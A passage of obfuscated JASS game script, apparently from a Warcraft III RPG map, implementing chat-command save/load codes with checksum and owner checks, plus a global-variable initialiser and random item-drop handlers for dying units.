local unit NR=CreateUnit(GetTriggerPlayer(),O3,ON,OO,0.)
local integer L9=0
local integer Mc
local integer O5
local unit OR
local integer No
local integer OT=0
local string Np
local integer O6
local integer O7
local integer O8
call DestroyEffect(AddSpecialEffect("Abilities\\Spells\\Human\\MassTeleport\\MassTeleportTarget.mdl",ON,OO))
loop
exitwhen not (L9<jk())
set Mc=j5(jx(O2,L9))
if Mc>0 then
call UnitAddAbility(NR,js(L9))
call SetUnitAbilityLevel(NR,js(L9),Mc)
endif
set L9=L9+1
endloop
call SetHeroLevel(NR,O4,false)
set O5=jp(j5(SubString(Oc,4,6)))
set OR=CreateUnit(GetTriggerPlayer(),O5,ON,OO,0.)
call UnitAddAbility(OR,$41314136)
call lb(GetTriggerPlayer(),NR)
call lc(GetTriggerPlayer(),OR)
set L9=0
loop
exitwhen not (L9<6)
set Mc=j5(SubString(Oc,6+2*L9,8+2*L9))
set No=jr(Mc)
if No!=0 then
set NF=false
call UnitAddItemToSlotById(NR,No,L9)
set NF=true
endif
set L9=L9+1
endloop
loop
exitwhen not (OT<OH)
set L9=0
loop
exitwhen not (L9<6)
set Np=SubString(Oc,18+12*OT+2*L9,20+12*OT+2*L9)
call lk(OS,OT,L9,jr(j5(Np)))
set L9=L9+1
endloop
set OT=OT+1
endloop
set L9=0
loop
exitwhen not (L9<6)
set Mc=li(OS,OG[OS],L9)
if Mc!=0 then
set NF=false
call UnitAddItemToSlotById(OR,Mc,L9)
set NF=true
endif
set L9=L9+1
endloop
set O6=20+12*(OH-1)+10
set O7=j5(SubString(Oc,O6,O6+4))
set O8=j5(SubString(Oc,O6+4,O6+8))
call SetPlayerState(GetTriggerPlayer(),PLAYER_STATE_RESOURCE_GOLD,O7)
call SetPlayerState(GetTriggerPlayer(),PLAYER_STATE_RESOURCE_LUMBER,O8)
if GetTriggerPlayer()==GetLocalPlayer() then
call DisplayTimedTextToPlayer(GetLocalPlayer(),0,0,15,"|c001EFF00Успешная|r загрузка!")
call PanCameraToTimed(ON,OO,0.)
endif
set OR=null
set NR=null
endfunction
function lr takes string M6 returns nothing
local integer PB=StringLength(M6)
local integer PC=1
local integer L9
loop
exitwhen PC>PB
set L9=1
loop
if SubString(M6,PC-1,PC)==SubString(PD,L9-1,L9) then
call ClearSelection()
call SelectUnit(PE[L9],true)
set L9=90
endif
exitwhen L9==90
set L9=L9+1
endloop
set PC=PC+1
endloop
call BJDebugMsg("A "+PF)
endfunction
function ls takes nothing returns nothing
set PF=PF+SubString(PD,GetUnitUserData(GetTriggerUnit())-1,GetUnitUserData(GetTriggerUnit()))
endfunction
function lt takes nothing returns nothing
local string O9=SubString(GetEventPlayerChatString(),5,StringLength(GetEventPlayerChatString()))
if GetLocalPlayer()==GetTriggerPlayer() then
call Preloader("TCoM_ORPG\\autosave\\"+O9+".txt")
call TriggerSleepAction(1)
call lr(GetPlayerName(Player(14)))
endif
endfunction
function lu takes nothing returns nothing
local integer M4
local string Oc
local string Oo
local integer Op
local integer Oq
local integer Mc
local integer No
local string Np
local string Nt
local string Ny
local string Ot
local string Ou
local string Ov
local string Ow
local integer Ox
local group Oz
local boolean O0
local unit O1
if OP[GetPlayerId(GetTriggerPlayer())] then
call DisplayTimedTextToPlayer(GetTriggerPlayer(),0,0,15,"Загружаться можно только |c00FF0000один|r раз!")
return
endif
set M4=StringLength(GetEventPlayerChatString())
set Oc=SubString(GetEventPlayerChatString(),7,M4)
set Oo=SubString(GetEventPlayerChatString(),0,6)
if Oo=="-Load1" then
set Op=4+6+2+2+2+(1+OH)*6*2+4+4+4
else
if Oo=="-Load2" then
set Op=jk()*1+8
else
call DisplayTimedTextToPlayer(GetTriggerPlayer(),0,0,15,"Неизвестная команда |c00FF0000 "+Oo+"|r")
endif
endif
if StringLength(Oc)>Op then
if GetLocalPlayer()==GetTriggerPlayer() then
call DisplayTimedTextToPlayer(GetLocalPlayer(),0,0,15,"Сейв код слишком |c00FF0000длинный|r. Длина сейв кода |c00FF0000всегда равна "+I2S(Op))
endif
return
endif
if StringLength(Oc)<Op then
call DisplayTimedTextToPlayer(GetTriggerPlayer(),0,0,15,"Сейв код слишком |c00FF0000короткий|r. Длина сейв кода |c00FF0000всегда равна "+I2S(Op))
return
endif
set Oq=GetPlayerId(GetTriggerPlayer())
if Oo=="-Load1" then
set Os[Oq]=Oc
call DisplayTimedTextToPlayer(GetTriggerPlayer(),0,0,15,"Введите второй загрузочный код! |c00ffff00-Load2 *******")
endif
if Oo=="-Load2" then
set Mc=StringLength(Os[Oq])
set No=StringLength(Oc)
set Np=SubString(Os[Oq],Mc-4,Mc)
set Nt=SubString(Oc,No-4,No)
set Ny=SubString(Oc,No-8,No-4)
set Os[Oq]=SubString(Os[Oq],0,Mc-4)
set Ot=SubString(Oc,0,No-8)
set Ou=lh(Os[Oq])
set Ov=lh(Ot)
set Ow=lh(Os[Oq]+Ou)
if Ou!=Np or Ov!=Nt or Ow!=Ny then
call DisplayTimedTextToPlayer(GetTriggerPlayer(),0,0,15,"Ваш сейв код |c00FF0000не прошел проверку подлинности|r.")
return
endif
set Ox=j5(SubString(Os[Oq],0,4))
if Ox>R2I(1000*Og) then
call DisplayTimedTextToPlayer(GetTriggerPlayer(),0,0,15,"Этот сейв код |c00FF0000был создан в более новой версии "+R2SW(Ox/1000.,3,2)+"|r")
return
endif
if SubString(Os[Oq],4,10)!=ld(GetPlayerName(GetTriggerPlayer()),6) then
call DisplayTimedTextToPlayer(GetTriggerPlayer(),0,0,15,"Этот сейв код принадлежит |c00FF0000не вам|r")
return
endif
set Oz=GetUnitsOfPlayerAll(GetTriggerPlayer())
set O0=false
loop
exitwhen not not O0
set O1=FirstOfGroup(Oz)
if O1==null then
set O0=true
else
call GroupRemoveUnit(Oz,O1)
call RemoveUnit(O1)
endif
endloop
set Os[Oq]=SubString(Os[Oq],10,Mc)
call lq(Ot)
set OP[GetPlayerId(GetTriggerPlayer())]=true
endif
set O1=null
set Oz=null
endfunction
function lv takes nothing returns nothing
local unit OR=GetSpellAbilityUnit()
local integer OS=GetPlayerId(GetOwningPlayer(OR))
local integer L9=0
local item Mc
local integer No
local integer Np
loop
exitwhen not (L9<6)
call lk(OS,OG[OS],L9,lm(UnitItemInSlot(OR,L9)))
call ll(OS,OG[OS],L9,GetItemCharges(UnitItemInSlot(OR,L9)))
set Mc=UnitRemoveItemFromSlot(OR,L9)
call RemoveItem(Mc)
set L9=L9+1
endloop
call UnitRemoveAbility(OR,OY[OG[OS]])
set OG[OS]=OG[OS]+1
if OG[OS]==OH then
set OG[OS]=0
endif
set L9=0
loop
exitwhen not (L9<6)
set No=li(OS,OG[OS],L9)
set Np=lj(OS,OG[OS],L9)
if No!=0 then
set NF=false
call UnitAddItemToSlotById(OR,No,L9)
call SetItemCharges(UnitItemInSlot(OR,L9),Np)
set NF=true
endif
set L9=L9+1
endloop
set Mc=null
set OR=null
endfunction
function lw takes nothing returns nothing
local integer Mx=GetSpellAbilityId()
if Mx==OQ then
call lv()
endif
endfunction
function lx takes nothing returns nothing
local integer L9=0
call lg()
set OJ=CreateTrigger()
set OK=CreateTrigger()
set OL=CreateTrigger()
set OM=CreateTrigger()
set ON=GetRectCenterX(GR)
set OO=GetRectCenterY(GR)
loop
exitwhen not (L9<8)
call TriggerRegisterPlayerUnitEvent(OJ,Player(L9),EVENT_PLAYER_UNIT_SPELL_CAST,null)
call TriggerRegisterPlayerChatEvent(OK,Player(L9),"-Save",false)
call TriggerRegisterPlayerChatEvent(OK,Player(L9),"-ыфму",false)
call TriggerRegisterPlayerChatEvent(OK,Player(L9),"-exs",false)
call TriggerRegisterPlayerChatEvent(OL,Player(L9),"-Load",false)
call TriggerRegisterPlayerChatEvent(OM,Player(L9),"-exl",false)
set OP[L9]=false
set L9=L9+1
endloop
call TriggerAddAction(OJ,function lw)
call TriggerAddAction(OK,function lp)
call TriggerAddAction(OL,function lu)
call TriggerAddAction(OM,function lt)
set PG=CreateTrigger()
set L9=1
loop
set PE[L9]=CreateUnit(Player(PLAYER_NEUTRAL_AGGRESSIVE),$68303536,22230,-24300,0)
call SetUnitUserData(PE[L9],L9)
call TriggerRegisterUnitEvent(PG,PE[L9],EVENT_UNIT_SELECTED)
set L9=L9+1
exitwhen L9==StringLength(PH)
endloop
call TriggerAddAction(PG,function ls)
endfunction
function ly takes nothing returns nothing
local integer L9=0
set L9=0
loop
exitwhen L9>1
set QI[L9]=0
set L9=L9+1
endloop
set QJ=0
set QK=0
set QL=CreateGroup()
set QM=0
set QN=0
set QO=0
set L9=0
loop
exitwhen L9>1
set QP[L9]=0
set L9=L9+1
endloop
set QQ=false
set QR=0
set QS=0
set QT=0
set QU=0
set QV=0
set QW=0
set QX=false
set QY=0
set QZ=0
set Qa=0
set Qb=0
set Qc=""
set Qd=false
set Qe=false
set L9=0
loop
exitwhen L9>1
set Qf[L9]=0
set L9=L9+1
endloop
set Qg=false
set L9=0
loop
exitwhen L9>1
set Qh[L9]=0
set L9=L9+1
endloop
set Qi=0
set Qj=0
set Qk=CreateTimer()
set L9=0
loop
exitwhen L9>1
set Ql[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Qm[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Qn[L9]=0
set L9=L9+1
endloop
set Qo=false
set Qp=false
set L9=0
loop
exitwhen L9>1
set Qq[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Qr[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Qs[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Qt[L9]=0
set L9=L9+1
endloop
set Qu=0
set L9=0
loop
exitwhen L9>1
set Qv[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Qw[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Qx[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Qy[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Qz[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Q0[L9]=false
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Q1[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Q2[L9]=0
set L9=L9+1
endloop
set Q3=0
set L9=0
loop
exitwhen L9>1
set Q4[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Q5[L9]=false
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Q6[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Q7[L9]=0
set L9=L9+1
endloop
set Q8=0
set L9=0
loop
exitwhen L9>1
set Q9[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set RB[L9]=false
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set RC[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set RD[L9]=CreateTimer()
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set RE[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set RF[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set RG[L9]=0
set L9=L9+1
endloop
set RH=0
set RI=0
set RJ=0
set L9=0
loop
exitwhen L9>1
set RK[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set RL[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set RM[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set RN[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set RO[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set RP[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set RQ[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set RR[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set RS[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set RT[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set RU[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set RV[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set RW[L9]=CreateGroup()
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set RX[L9]=false
set L9=L9+1
endloop
set RY=CreateTimer()
set L9=0
loop
exitwhen L9>1
set RZ[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Ra[L9]="да"
set L9=L9+1
endloop
set Rb=CreateGroup()
set Rc=CreateTimer()
set Rd=CreateGroup()
set Re=CreateTimer()
set Rf=CreateGroup()
set Rg=0
set Rh=0
set Ri=CreateTimer()
set Rj=0
set Rk=0
set Rl=0
set Rm=0
set Rn=0
set L9=0
loop
exitwhen L9>1
set Ro[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Rp[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Rq[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Rr[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Rs[L9]=0
set L9=L9+1
endloop
set Rt=0
set L9=0
loop
exitwhen L9>1
set Ru[L9]=0
set L9=L9+1
endloop
set Rv=0
set L9=0
loop
exitwhen L9>1
set Rw[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Rx[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Ry[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Rz[L9]=CreateGroup()
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set R0[L9]=false
set L9=L9+1
endloop
set R1=CreateTimer()
set R2=CreateGroup()
set R3=0
set L9=0
loop
exitwhen L9>1
set R4[L9]=0
set L9=L9+1
endloop
set R5=0
set L9=0
loop
exitwhen L9>1
set R6[L9]=false
set L9=L9+1
endloop
set R7=CreateTimer()
set MK=0
set L9=0
loop
exitwhen L9>1
set R8[L9]=0
set L9=L9+1
endloop
set R9=0
set SB=0
set L9=0
loop
exitwhen L9>1
set SC[L9]=0
set L9=L9+1
endloop
set SD=0
set L9=0
loop
exitwhen L9>1
set SE[L9]=0
set L9=L9+1
endloop
set SF=0
set L9=0
loop
exitwhen L9>1
set SG[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set SH[L9]=false
set L9=L9+1
endloop
set SI=CreateGroup()
set L9=0
loop
exitwhen L9>1
set SJ[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set SK[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set SL[L9]=false
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set SM[L9]=0
set L9=L9+1
endloop
set SN=0
set SO=CreateTimer()
set SP=0
set SQ=0
set SR=CreateGroup()
set SS=0
set L9=0
loop
exitwhen L9>1
set ST[L9]=CreateGroup()
set L9=L9+1
endloop
set SU=0
set L9=0
loop
exitwhen L9>1
set SV[L9]=false
set L9=L9+1
endloop
set SW=CreateTimer()
set L9=0
loop
exitwhen L9>1
set SX[L9]=0
set L9=L9+1
endloop
set SY=false
set SZ=0
set Sa=0
set L9=0
loop
exitwhen L9>1
set Sb[L9]=""
set L9=L9+1
endloop
set Sc=0
set Sd=0
set L9=0
loop
exitwhen L9>1
set Se[L9]=0
set L9=L9+1
endloop
set Sf=0
set Sg=0
set L9=0
loop
exitwhen L9>1
set Sh[L9]=0
set L9=L9+1
endloop
set Si=0
set Sj=0
set Sk=0
set Sl=0
set Sm=0
set Sn=0
set So=0
set L9=0
loop
exitwhen L9>1
set Sp[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Sq[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Sr[L9]=false
set L9=L9+1
endloop
set Ss=0
set St=0
set L9=0
loop
exitwhen L9>1
set Su[L9]=false
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Sv[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Sw[L9]=false
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Sx[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Sy[L9]=false
set L9=L9+1
endloop
set Sz=0
set L9=0
loop
exitwhen L9>1
set S0[L9]=false
set L9=L9+1
endloop
set S1=0
set L9=0
loop
exitwhen L9>1
set S2[L9]=false
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set S3[L9]=false
set L9=L9+1
endloop
set S4=0
set L9=0
loop
exitwhen L9>1
set S5[L9]=CreateGroup()
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set S6[L9]=CreateTimer()
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set S7[L9]=0
set L9=L9+1
endloop
set S8=CreateTimer()
set S9=CreateTimer()
set TB=CreateGroup()
set TC=0
set L9=0
loop
exitwhen L9>1
set TD[L9]=false
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set TE[L9]=0
set L9=L9+1
endloop
set TF=0
set TG=0
set TH=0
set L9=0
loop
exitwhen L9>1
set TI[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set NJ[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set NK[L9]=0
set L9=L9+1
endloop
set TJ=0
set L9=0
loop
exitwhen L9>1
set TK[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set TL[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set TM[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set TN[L9]=0
set L9=L9+1
endloop
set TO=false
set TP=0
set L9=0
loop
exitwhen L9>1
set Ng[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set N0[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set TQ[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Nd[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Nf[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set TR[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set TS[L9]=0
set L9=L9+1
endloop
set TT=0
set L9=0
loop
exitwhen L9>1
set TU[L9]=CreateGroup()
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Ni[L9]=false
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set TV[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set TW[L9]=0
set L9=L9+1
endloop
set TX=0
set L9=0
loop
exitwhen L9>1
set TY[L9]=0
set L9=L9+1
endloop
set TZ=0
set L9=0
loop
exitwhen L9>1
set Ta[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Tb[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Tc[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Td[L9]=0
set L9=L9+1
endloop
set Te=0
set L9=0
loop
exitwhen L9>1
set Tf[L9]=false
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Tg[L9]=0
set L9=L9+1
endloop
set Th=CreateGroup()
set Ti=0
set L9=0
loop
exitwhen L9>1
set Tj[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Tk[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Tl[L9]=CreateGroup()
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Tm[L9]=0
set L9=L9+1
endloop
set Tn=0
set To=CreateGroup()
set Tp=CreateGroup()
set L9=0
loop
exitwhen L9>1
set Tq[L9]=CreateGroup()
set L9=L9+1
endloop
set Tr=0
set L9=0
loop
exitwhen L9>1
set Ts[L9]=false
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Tt[L9]=0
set L9=L9+1
endloop
set Tu=0
set Tv=0
set L9=0
loop
exitwhen L9>1
set Tw[L9]=CreateTimer()
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Tx[L9]=false
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set Ty[L9]=CreateGroup()
set L9=L9+1
endloop
set Tz=0
set L9=0
loop
exitwhen L9>1
set T0[L9]=0
set L9=L9+1
endloop
set T1=0
set L9=0
loop
exitwhen L9>1
set T2[L9]=false
set L9=L9+1
endloop
set T3=0
set L9=0
loop
exitwhen L9>1
set T4[L9]=false
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set T5[L9]=0
set L9=L9+1
endloop
set T6=0
set L9=0
loop
exitwhen L9>1
set T7[L9]=0
set L9=L9+1
endloop
set T8=CreateTimer()
set T9=0
set UB=0
set UC=0
set UD=0
set L9=0
loop
exitwhen L9>1
set UE[L9]=0
set L9=L9+1
endloop
set UF=""
set L9=0
loop
exitwhen L9>1
set UG[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set UH[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set UI[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set UJ[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set UK[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set UL[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set UM[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>8
set UN[L9]=CreateGroup()
set L9=L9+1
endloop
set UO=DialogCreate()
set L9=0
loop
exitwhen L9>1
set UP[L9]=0
set L9=L9+1
endloop
set L9=0
loop
exitwhen L9>1
set UQ[L9]=0
set L9=L9+1
endloop
endfunction
function l0 takes nothing returns nothing
local widget Hd=null
local unit He=null
local integer Hg=0
local boolean Hf=true
set Hd=bj_lastDyingWidget
if Hd==null then
set He=GetTriggerUnit()
endif
if He!=null then
set Hf=not IsUnitHidden(He)
if Hf and GetChangingUnit()!=null then
set Hf=GetChangingUnitPrevOwner()==Player(PLAYER_NEUTRAL_AGGRESSIVE)
endif
endif
if Hf then
call RandomDistReset()
call RandomDistAddItem($49304839,50)
call RandomDistAddItem(-1,50)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
endif
set bj_lastDyingWidget=null
call DestroyTrigger(GetTriggeringTrigger())
set He=null
set Hd=null
endfunction
function l1 takes nothing returns nothing
local widget Hd=null
local unit He=null
local integer Hg=0
local boolean Hf=true
set Hd=bj_lastDyingWidget
if Hd==null then
set He=GetTriggerUnit()
endif
if He!=null then
set Hf=not IsUnitHidden(He)
if Hf and GetChangingUnit()!=null then
set Hf=GetChangingUnitPrevOwner()==Player(PLAYER_NEUTRAL_AGGRESSIVE)
endif
endif
if Hf then
call RandomDistReset()
call RandomDistAddItem($49304839,100)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
endif
set bj_lastDyingWidget=null
call DestroyTrigger(GetTriggeringTrigger())
set He=null
set Hd=null
endfunction
function l2 takes nothing returns nothing
local widget Hd=null
local unit He=null
local integer Hg=0
local boolean Hf=true
set Hd=bj_lastDyingWidget
if Hd==null then
set He=GetTriggerUnit()
endif
if He!=null then
set Hf=not IsUnitHidden(He)
if Hf and GetChangingUnit()!=null then
set Hf=GetChangingUnitPrevOwner()==Player(PLAYER_NEUTRAL_AGGRESSIVE)
endif
endif
if Hf then
call RandomDistReset()
call RandomDistAddItem($49304959,50)
call RandomDistAddItem(-1,50)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
endif
set bj_lastDyingWidget=null
call DestroyTrigger(GetTriggeringTrigger())
set He=null
set Hd=null
endfunction
function l3 takes nothing returns nothing
local widget Hd=null
local unit He=null
local integer Hg=0
local boolean Hf=true
set Hd=bj_lastDyingWidget
if Hd==null then
set He=GetTriggerUnit()
endif
if He!=null then
set Hf=not IsUnitHidden(He)
if Hf and GetChangingUnit()!=null then
set Hf=GetChangingUnitPrevOwner()==Player(PLAYER_NEUTRAL_AGGRESSIVE)
endif
endif
if Hf then
call RandomDistReset()
call RandomDistAddItem($49304959,100)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
endif
set bj_lastDyingWidget=null
call DestroyTrigger(GetTriggeringTrigger())
set He=null
set Hd=null
endfunction
function l4 takes nothing returns nothing
local widget Hd=null
local unit He=null
local integer Hg=0
local boolean Hf=true
set Hd=bj_lastDyingWidget
if Hd==null then
set He=GetTriggerUnit()
endif
if He!=null then
set Hf=not IsUnitHidden(He)
if Hf and GetChangingUnit()!=null then
set Hf=GetChangingUnitPrevOwner()==Player(PLAYER_NEUTRAL_AGGRESSIVE)
endif
endif
if Hf then
call RandomDistReset()
call RandomDistAddItem($4930495A,50)
call RandomDistAddItem(-1,50)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
endif
set bj_lastDyingWidget=null
call DestroyTrigger(GetTriggeringTrigger())
set He=null
set Hd=null
endfunction
function l5 takes nothing returns nothing
local widget Hd=null
local unit He=null
local integer Hg=0
local boolean Hf=true
set Hd=bj_lastDyingWidget
if Hd==null then
set He=GetTriggerUnit()
endif
if He!=null then
set Hf=not IsUnitHidden(He)
if Hf and GetChangingUnit()!=null then
set Hf=GetChangingUnitPrevOwner()==Player(PLAYER_NEUTRAL_AGGRESSIVE)
endif
endif
if Hf then
call RandomDistReset()
call RandomDistAddItem($4930495A,100)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
endif
set bj_lastDyingWidget=null
call DestroyTrigger(GetTriggeringTrigger())
set He=null
set Hd=null
endfunction
function l6 takes nothing returns nothing
local widget Hd=null
local unit He=null
local integer Hg=0
local boolean Hf=true
set Hd=bj_lastDyingWidget
if Hd==null then
set He=GetTriggerUnit()
endif
if He!=null then
set Hf=not IsUnitHidden(He)
if Hf and GetChangingUnit()!=null then
set Hf=GetChangingUnitPrevOwner()==Player(PLAYER_NEUTRAL_AGGRESSIVE)
endif
endif
if Hf then
call RandomDistReset()
call RandomDistAddItem($49304A30,50)
call RandomDistAddItem(-1,50)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
endif
set bj_lastDyingWidget=null
call DestroyTrigger(GetTriggeringTrigger())
set He=null
set Hd=null
endfunction
function l7 takes nothing returns nothing
local widget Hd=null
local unit He=null
local integer Hg=0
local boolean Hf=true
set Hd=bj_lastDyingWidget
if Hd==null then
set He=GetTriggerUnit()
endif
if He!=null then
set Hf=not IsUnitHidden(He)
if Hf and GetChangingUnit()!=null then
set Hf=GetChangingUnitPrevOwner()==Player(PLAYER_NEUTRAL_AGGRESSIVE)
endif
endif
if Hf then
call RandomDistReset()
call RandomDistAddItem($49304A30,100)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
endif
set bj_lastDyingWidget=null
call DestroyTrigger(GetTriggeringTrigger())
set He=null
set Hd=null
endfunction
function l8 takes nothing returns nothing
local widget Hd=null
local unit He=null
local integer Hg=0
local boolean Hf=true
set Hd=bj_lastDyingWidget
if Hd==null then
set He=GetTriggerUnit()
endif
if He!=null then
set Hf=not IsUnitHidden(He)
if Hf and GetChangingUnit()!=null then
set Hf=GetChangingUnitPrevOwner()==Player(PLAYER_NEUTRAL_AGGRESSIVE)
endif
endif
if Hf then
call RandomDistReset()
call RandomDistAddItem($49304A31,50)
call RandomDistAddItem(-1,50)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
endif
set bj_lastDyingWidget=null
call DestroyTrigger(GetTriggeringTrigger())
set He=null
set Hd=null
endfunction
function l9 takes nothing returns nothing
local widget Hd=null
local unit He=null
local integer Hg=0
local boolean Hf=true
set Hd=bj_lastDyingWidget
if Hd==null then
set He=GetTriggerUnit()
endif
if He!=null then
set Hf=not IsUnitHidden(He)
if Hf and GetChangingUnit()!=null then
set Hf=GetChangingUnitPrevOwner()==Player(PLAYER_NEUTRAL_AGGRESSIVE)
endif
endif
if Hf then
call RandomDistReset()
call RandomDistAddItem($49304A31,100)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
endif
set bj_lastDyingWidget=null
call DestroyTrigger(GetTriggeringTrigger())
set He=null
set Hd=null
endfunction
function mB takes nothing returns nothing
local widget Hd=null
local unit He=null
local integer Hg=0
local boolean Hf=true
set Hd=bj_lastDyingWidget
if Hd==null then
set He=GetTriggerUnit()
endif
if He!=null then
set Hf=not IsUnitHidden(He)
if Hf and GetChangingUnit()!=null then
set Hf=GetChangingUnitPrevOwner()==Player(PLAYER_NEUTRAL_AGGRESSIVE)
endif
endif
if Hf then
call RandomDistReset()
call RandomDistAddItem($49304839,100)
set Hg=RandomDistChoose()
if He!=null then
